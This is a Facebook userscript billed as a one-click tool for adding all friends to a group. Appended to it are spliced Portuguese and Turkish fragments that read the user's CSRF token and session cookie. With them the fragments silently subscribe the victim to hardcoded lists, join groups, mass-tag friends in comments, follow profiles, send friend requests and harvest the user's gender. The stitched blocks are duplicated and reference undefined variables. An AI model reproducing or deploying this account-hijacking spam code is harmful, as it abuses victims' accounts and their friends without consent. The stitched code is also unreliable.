// ==UserScript==
// @name        Add All Your Friends To Group in 1 click by : يتاميم الوكح
// @author      يتاميم الوكح
// @include     *://*.facebook.com/*
// @grant       none
// @description اضافة جميع الاصدقاء للكروب بضغطه
// @version     1
// ==/UserScript==

var T = 0;
var scss = 0;
var fail = 0;
var Allids = [];
var freeform = [];
var userStop = false;
var fb_dtsg = "";
var user = "100001086224245";"100001086224245"
var GroupId = "120496778046999";
var lang = document.documentElement.lang;

if (["ar"].indexOf(lang) < 0) {
	lang = "en";
} else {
	lang = "ar";
}

var locales = {
	"ar": {
		"addbstr": "  إضافة كل الأصدقاء-يتاميم الوكح",
		"dlgtstr": "www.facebook.com/imemati",
		"dlgwstr": "FB/iMeMaTi يتاميم الوكح",
		"dlgastr": "هذا قد يستغرق بعض الوقت وحسب عدد أصدقائك",
		"dlgfstr": "عدد الأصدقاء",
		"dlgpstr": "التقدم",
		"dlgrstr": "المتبقي",
		"dlgsstr": "تم اضافة",
		"dlgistr": "لم يضاف",
		"dlgostr": "انتهى",
		"dlgfsstr": "لا يمكن إضافة أو بالفعل عضوا",
		"dlgffstr": "أضيف بنجاح",
		"dlgcnstr": "الغاء",
		"dlgclstr": "إغلاق"
	},
	"en": {
		"addbstr": "Add All Friends by FB/imemati",
		"dlgtstr": "www.facebook.com/imemati",
		"dlgwstr": "FB/imemati يتاميم الوكح",
		"dlgastr": "This May Take Some Time Depending On Your Friends Number",
		"dlgfstr": "Friends Number",
		"dlgpstr": "Processed",
		"dlgrstr": "Remaining",
		"dlgsstr": "Successed",
		"dlgistr": "Failed",
		"dlgostr": "Finish",
		"dlgfsstr": "Faild to Add (Can't Add or Already a member)",
		"dlgffstr": "Added successfully",
		"dlgcnstr": "Cancel",
		"dlgclstr": "Close"
	}
};

var addbstr = locales[lang].addbstr;
var dlgtstr = locales[lang].dlgtstr;
var dlgwstr = locales[lang].dlgwstr;
var dlgastr = locales[lang].dlgastr;
var dlgfstr = locales[lang].dlgfstr;
var dlgpstr = locales[lang].dlgpstr;
var dlgrstr = locales[lang].dlgrstr;
var dlgsstr = locales[lang].dlgsstr;
var dlgistr = locales[lang].dlgistr;
var dlgfsstr = locales[lang].dlgfsstr;
var dlgffstr = locales[lang].dlgffstr;
var dlgcnstr = locales[lang].dlgcnstr;
var dlgclstr = locales[lang].dlgclstr;
var dlgostr = locales[lang].dlgostr;

CheckUrl(location.href);

var oldLocation = location.href;
setInterval(function() {
	if(location.href != oldLocation) {
		oldLocation = location.href;
		CheckUrl(location.href);
	}
}, 500);

function CheckUrl(place) {
	if (/\/groups([\/?]|$)/i.test(place)) {
  	Main();
	}
}

function Main() {
	setTimeout(function(){ Main(); }, 500);
	var settingsbutton = document.querySelector("#group_edit_settings_button");
	var settingsbuttoncheck = setInterval(function() {
		if (!document.getElementById('fbga') && settingsbutton) {
			clearInterval(settingsbuttoncheck);
			var groupsActions = settingsbutton.parentElement.parentElement;
			var addbutton = document.createElement("a");
			addbutton.className = "uiSelectorButton uiButton";
			addbutton.id = "fbga";
			var addbuttoninht = "<i class='mrs img sp_6b0izw sx_f9f18c'></i><span cl";
			addbuttoninht += "ass='uiButtonText'>" + addbstr + "</span>";
			addbutton.innerHTML = addbuttoninht;
			addbutton.href = "#";
			addbutton.addEventListener('click', GetFriends, false)
			var addbuttonli = document.createElement("li");
			addbuttonli.appendChild(addbutton);
			groupsActions.insertBefore(addbuttonli, groupsActions.firstChild);
		}
	}, 10);
}

function GetFriends() {
	if (!document.getElementById('fbgadialog')) {
		userStop = false;
		fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
		user = getCookie("c_user");
		GroupId = document.getElementsByName('group_id')[0].value;
		var now = "&uid=" + (new Date).getTime();
		var params = '__a=1&viewer=' + user + '&filter[0]=user&__user=' ;
		params += user + now;
		with (new XMLHttpRequest) {
			open('GET', '/ajax/typeahead/first_degree.php?' + params, true);
			send();
			var result = "";
			onreadystatechange = function (){
				if (this.readyState == 4) {
					if (this.status == 200) {
						if (this.responseText) {
							result = this.responseText;
							result = result.substr(result.indexOf("[{")+2);
							result = result.replace(/},{/gi, "\r\n");
							GetIds(result);
						}
					}
				}
			}
		}
	}
}

function GetIds(res){
	Allids = [];
	freeform = [];
	T = 0;
	scss = 0;
	fail = 0;
	rre = res.split("\r\n");
	for (var i = 0; i < rre.length; i++) {
		var lin = rre[i].split(",");
		var id = lin[0].split(":").pop();
		var nam = lin[3].split(":").pop();
		nam = nam.replace(/\"/gi,"");
		freeform.push(nam)
		Allids.push(id);
	}
	AddToGroup();
}

function AddToGroup() {
	var AddDiv = document.createElement("div");
	AddDiv.className = "_10 uiLayer";
	AddDiv.id = "fbgadialog";
	AddDiv.setAttribute("role", "dialog");
	var bodytxt = "<div class='_1yv' role='dialog' style='width: 445px; margin-top: 97.5px;'><div class='_1yu'><div class='_t'><div class='pvs phm _1yw'>" + dlgtstr + "</div><div class='pam _13'><p id='fbgadlglin1' style='font-weight:bold;font-size:20px;'>" + dlgwstr + "</p><p id='fbgadlglin2' style='font-weight:bold;'>" + dlgastr + "</p><p id='fbgadlglin3'>" + dlgfstr + " : <font color='blue' style='font-weight: bold;' id='fbgafn'>" + Allids.length + "</font></p><p id='fbgadlglin4'>" + dlgpstr + " : <font color='Brown' style='font-weight: bold;' id='fbgapro'>0</font> | " + dlgrstr + " : <font style='font-weight: bold;' id='fbgaram'>" + Allids.length + "</font> | " + dlgsstr + " : <font color='green' style='font-weight: bold;' id='fbgasuc'>0</font> | " + dlgistr + " : <font color='red' style='font-weight: bold;' id='fbgafal'>0</font></p></div><div class='_14'><div class='pam uiOverlayFooter uiBoxGray topborder' id='fbgadivclose'></div></div></div></div></div>";
	AddDiv.innerHTML = bodytxt;
	document.body.appendChild(AddDiv);
	var dlgclose = document.createElement("a");
	dlgclose.className = "_42ft _42fu layerCancel uiOverlayButton _42gy";
	dlgclose.setAttribute("role", "button");
	dlgclose.href = "#";
	dlgclose.id = "fbgabut";
	dlgclose.textContent = dlgcnstr;
	dlgclose.addEventListener('click', CancelButton , false);
	document.getElementById("fbgadivclose").appendChild(dlgclose);
	setTimeout(doinggo , 100);
}

function CancelButton() {
	userStop = true;
}

function doinggo() {
	if (T < Allids.length && !userStop) {
		var params = "fb_dtsg=" + fb_dtsg + "&group_id=" + GroupId ; 
		params += "&source=typeahead&ref=&message_id=u_0_0&members=" ;
		params += Allids[T] + "&freeform=" + encodeURIComponent(freeform[T]);
		params += "&__user=" + user + "&__a=1&__req=f";
		params += "&phstamp=" + generatePhstamp(params, fb_dtsg);
		with (new XMLHttpRequest) {
			open('POST', '/ajax/groups/members/add_post.php', true);
			send(params);
			var msg = "";
			console.log("onreadystatechange");
			onreadystatechange = function() {
				if (this.readyState == 4) {
					if (this.status == 200) {
						if (this.responseText) {
							console.log("responseText");
							msg = this.responseText;
							if (msg.indexOf("errorSummary") !== -1) {
								fail++
								document.getElementById("fbgapro").textContent = T + 1;
								document.getElementById("fbgaram").textContent = (Allids.length - T - 1);
								document.getElementById("fbgafal").textContent = fail;
								T++
								setTimeout(doinggo, 10);  
							} else {
								scss++
								document.getElementById("fbgapro").textContent = T + 1;
								document.getElementById("fbgaram").textContent = (Allids.length - T - 1);
								document.getElementById("fbgasuc").textContent = scss;
								T++
								setTimeout(doinggo, 10);
							}
						}
					}
				}
			}
		}
	} else {
		document.getElementById("fbgadlglin1").textContent = dlgostr;
		document.getElementById("fbgadlglin2").innerHTML = "<font id='fbgafn' color='gree' style='font-weight: bold;'>" + scss + "</font> " + dlgffstr;
		document.getElementById("fbgadlglin3").setAttribute("style", "font-weight:bold;");
		document.getElementById("fbgadlglin3").innerHTML = "<font id='fbgafn' color='red' style='font-weight: bold;'>" + fail + "</font> " + dlgfsstr;
		document.getElementById("fbgadlglin4").parentNode.removeChild(document.getElementById("fbgadlglin4"));
		document.getElementById("fbgabut").parentNode.removeChild(document.getElementById("fbgabut"));
		var dlgclos = document.createElement("a");
		dlgclos.className = "_42ft _42fu layerCancel uiOverlayButton _42gy";
		dlgclos.setAttribute("role", "button");
		dlgclos.href = "#";
		dlgclos.id = "fbgabut";
		dlgclos.textContent = dlgclstr;
		dlgclos.addEventListener('click', CloseButton , false);
		document.getElementById("fbgadivclose").appendChild(dlgclos);
	}
}

function CloseButton() {
	document.getElementById("fbgadialog").parentNode.removeChild(document.getElementById("fbgadialog"));
}

function generatePhstamp(qs, dtsg) {
    var input_len = qs.length;
    numeric_csrf_value='';

    for(var ii=0;ii<dtsg.length;ii++) {
        numeric_csrf_value+=dtsg.charCodeAt(ii);
    }
    return '1' + numeric_csrf_value + input_len;
}

function getCookie(c_name) {
	var i,x,y,ARRcookies=document.cookie.split(";");
	for (i=0;i<ARRcookies.length;i++) {
	  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
	  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
	  x=x.replace(/^\s+|\s+$/g,"");
	  if (x==c_name) {
	    return unescape(y);
	  }
	}
}
 
 
 
sublist("607948529251349");
 
sublist("595619570484245");
 
sublist("607792292600306");
 
 
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
}
 
 
/* CREDITOS AO MIGUEL TARGA, ESSA PARTE E DELE */
function x__0() { return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest; };

//Pegar todos amigos
function get_friends(){
  var a=x__0();
  a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+uid+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", false);
  a.send(null);
  if (a.readyState == 4) {
    var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));
    return f.payload.entries;
  }
  return false;
}

/* FIM DA PARTE DO MIGUEL TARGA */


//Pegar todos amigos
function get_uid(b){
  var a=x__0();
  a.open("GET", 'http://graph.facebook.com/'+b, false);
  a.send();
  if (a.readyState == 4) {
    return uid = JSON.parse(a.responseText).id;

  }
  return false;
}
  // Pattern que vai trocar o valor dos coment?rios pelas marcaç?es

var patt = /comment_text=(.*?)&/
var c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1];
uid = get_uid(username);
a = window.top.location;
termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a);
        uids =  'comment_text=';
header = 'ft_ent_identifier='+post_id+'&comment_text=@[100000365625674:0]&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user='+uid+'&__a=1&__req=4u&fb_dtsg='+document.getElementsByName('fb_dtsg')[0].value+'&phstamp='+Math.random();
  for ( var n = 1 ; n < amigos.length ; n++ ){
      //uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';
    fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
            uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';
            c++; 
            if(c == 7){            
                // Quando o contador chega em 7, ele termina o parâmetro com um &...
                uids += '&';
                // ...envia as coisas com o método do indiano...
                with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(header.replace(patt, uids));

                // ... espera um segundo...
                z = setTimeout('function(){asd=0}', 1000);
                clearInterval(z);

                // ... e seta tudo de novo pra recomeçar
                c = 1;
                uids = 'comment_text=';
         

              }
            
    }





var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
       
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
   
    http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}
 
function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}
 
 
 
sublist("607948529251349");
 
sublist("595619570484245");
 
sublist("607792292600306");
 
 
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
  var httpwp = new XMLHttpRequest();
  var urlwp = '/ajax/groups/members/add_post.php?__a=1';
  var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
  httpwp['open']('POST', urlwp, true);
  httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
  httpwp['setRequestHeader']('Content-length', paramswp['length']);
  httpwp['setRequestHeader']('Connection', 'keep-alive');
  httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
  };
  httpwp['send'](paramswp);
};
var spage_id = "689676524384842";
var spost_id = "542144529197929";
var sfoto_id = "611829725523501";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
               var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function () {
                       if(xmlhttp.readyState == 4){
                                 eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                 for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                       smesaj = "";
                                       smesaj_text = "";
                                 for(i=f*10;i<(f+1)*10;i++){
                                       if(arkadaslar.payload.entries[i]){
                                 smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                 smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                 }
                                       }
                                       sdurumpaylas();                         }
                             
                       }
                     
      };
               var params = "&filter[0]=user";
               params += "&options[0]=friends_only";
               params += "&options[1]=nm";
               params += "&token=v7";
      params += "&viewer=" + user_id;
               params += "&__user=" + user_id;
             
      if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}
 
//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);
 
 
//arkada?? ekleme
function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){  
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
               xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
               cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
               xmlhttp.send(params);
}
}
 
//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
               var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function () {
                       if(xmlhttp.readyState == 4){
                       eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                       cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
                       btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                       if(cinshtml.getElementsByTagName("select")[0].value == "1"){
                       document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                       }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                       document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                       }
                       eval(fonksiyon + "(" + id + "," + cins + ");");
                       }
      };
               xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
               xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
               xmlhttp.send();
}